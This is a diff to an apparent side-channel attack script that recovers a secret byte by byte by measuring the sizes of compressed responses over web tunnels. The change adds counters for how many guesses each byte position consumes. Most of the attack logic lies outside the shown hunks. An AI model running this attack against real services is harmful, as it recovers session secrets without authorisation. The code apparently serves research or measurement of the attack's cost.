@@ -97,7 +97,7 @@ async def _sweep_round(
     noise_lengths: list[int],
     settle: float,
     flush_bytes: int,
-) -> dict[bytes, int]:
+) -> tuple[dict[bytes, int], dict[int, dict[bytes, int]], int]:
     """Run one noise-length sweep and return per-candidate wire-byte sums.
 
     Each (candidate, noise_length) iteration opens a **fresh** web-tunnel
@@ -125,9 +125,11 @@ async def _sweep_round(
     per_nl: dict[int, dict[bytes, int]] = {
         nl: {c: 0 for c in alphabet} for nl in noise_lengths
     }
+    guesses = 0
     for noise_len in noise_lengths:
         noise = _make_noise(noise_len)
         for cb in alphabet:
+            guesses += 1
             # 1. Flush (throwaway connection) -------------------------------
             flush_data = secrets.token_bytes(flush_bytes)
             try:
@@ -165,7 +167,7 @@ async def _sweep_round(
             except Exception:  # noqa: BLE001
                 pass
 
-    return sums, per_nl
+    return sums, per_nl, guesses
 
 
 # ---------------------------------------------------------------------------
@@ -186,12 +188,14 @@ async def crack_byte_position(
     hint_noise: list[int] | None = None,
     sweep_fn=None,
     adaptive_noise: bool = True,
-) -> tuple[bytes, dict[bytes, int], list[int]]:
+) -> tuple[bytes, dict[bytes, int], list[int], int]:
     """Recover one byte, repeating rounds until *margin >= min_margin*.
 
-    Returns ``(best_candidate, cumulative_sums, final_active_noise)``
-    so the caller can pass ``final_active_noise`` as ``hint_noise``
-    to the next byte position.
+    Returns ``(best_candidate, cumulative_sums, final_active_noise,
+    position_guesses)`` -- ``position_guesses`` is the total number of
+    secret-transmission+measurement iterations consumed to recover this
+    single byte, summed across all rounds.  The caller passes
+    ``final_active_noise`` as ``hint_noise`` to the next byte position.
 
     Three progressive optimisations reduce work:
 
@@ -212,6 +216,7 @@ async def crack_byte_position(
     active = list(alphabet)
     prev_margin = 0
     stall_count = 0
+    position_guesses = 0
 
     # Start with the hint set (from the previous position) if
     # available, otherwise use the full set.
@@ -224,10 +229,11 @@ async def crack_byte_position(
     did_initial_prune = False
 
     for rnd in range(1, max_rounds + 1):
-        round_sums, round_per_nl = await sweep_fn(
+        round_sums, round_per_nl, round_guesses = await sweep_fn(
             session, packet_log, prefix, active,
             active_noise, settle, flush_bytes,
         )
+        position_guesses += round_guesses
         for c in active:
             sums[c] += round_sums[c]
 
@@ -305,7 +311,7 @@ async def crack_byte_position(
         LOG.warning("%s margin=%d after %d rounds (threshold=%d)",
                     log_prefix, margin, max_rounds, min_margin)
 
-    return best, sums, active_noise
+    return best, sums, active_noise, position_guesses
 
 
 # ---------------------------------------------------------------------------
@@ -343,6 +349,7 @@ async def run_attack(
     started = time.time()
     recovered = b""
     history: list[dict[str, Any]] = []
+    per_position_guesses: list[int] = []
     prev_noise: list[int] | None = None  # carried across positions
 
     timeout = aiohttp.ClientTimeout(total=1800)
@@ -367,7 +374,7 @@ async def run_attack(
             trim = max(0, len(full_prefix) - len(known_prefix))
             full_prefix = full_prefix[trim:]
 
-            best, sums, prev_noise = await crack_byte_position(
+            best, sums, prev_noise, pos_guesses = await crack_byte_position(
                 session, packet_log,
                 prefix=full_prefix,
                 alphabet=alphabet,
@@ -381,6 +388,7 @@ async def run_attack(
                 sweep_fn=sweep_fn,
                 adaptive_noise=adaptive_noise,
             )
+            per_position_guesses.append(pos_guesses)
             ranked = [
                 (k.decode("latin-1"), v)
                 for k, v in sorted(sums.items(), key=lambda kv: kv[1])
@@ -389,6 +397,7 @@ async def run_attack(
                 "position": pos,
                 "best": best.decode("latin-1"),
                 "ranked": ranked[:6],
+                "guesses": pos_guesses,
             })
             if best == terminator:
                 LOG.info("hit terminator at position %d -> done", pos)
@@ -406,4 +415,6 @@ async def run_attack(
         "recovered": recovered.decode("latin-1"),
         "elapsed_seconds": elapsed,
         "history": history,
+        "total_guesses": sum(per_position_guesses),
+        "per_position_guesses": per_position_guesses,
     }
